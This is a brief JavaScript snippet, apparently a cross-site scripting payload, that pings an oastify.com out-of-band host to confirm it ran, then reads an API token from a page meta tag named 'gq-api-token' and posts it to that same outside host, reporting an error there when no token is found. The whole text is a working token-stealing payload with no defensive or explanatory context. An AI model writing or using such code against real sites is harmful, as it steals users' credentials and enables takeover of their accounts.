// Confirm execution
fetch('https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com?hit=steal5');

// Wait for DOM
setTimeout(() => {
  const token = document.querySelector('meta[name="gq-api-token"]')?.content;
  if (!token) {
    fetch('https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com?error=no_token');
    return;
  }

  fetch('https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token })
  });
}, 1000);
